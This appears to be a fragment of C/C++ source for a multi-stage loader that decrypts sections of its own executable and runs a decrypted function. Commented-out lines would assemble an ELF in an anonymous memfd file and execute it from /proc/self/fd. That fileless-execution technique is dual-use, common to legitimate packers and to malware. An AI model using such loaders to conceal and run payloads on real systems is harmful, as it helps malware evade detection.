
#include "stdafx.h"

#include "Stage1.h"
#include "Stage2.h"

#define MEMFD_CREATE 319
inline int anonFile(const char *name, unsigned int flags) {
    return syscall(MEMFD_CREATE, name, flags);
}


int main(int argc, char* argv[]) {
    
    // ===== Stages need to be done in reverse order!
    
    Stage2 loader(argv[0]);
    if (!loader.decodeSections()) {
        printf("Stage 2 failed!\n");
        return 0;
    }
 
    decodePayload(); // Execute decrypted function from stage 2.

    // Stage1 elfBuilder(anonFile("a", 1), loader.getKey());

    // Stage1::buildElf(elfBuilder);


    // int fdFinalObject = anonFile("x", 1);
    // execle("/proc/self/fd/");
} 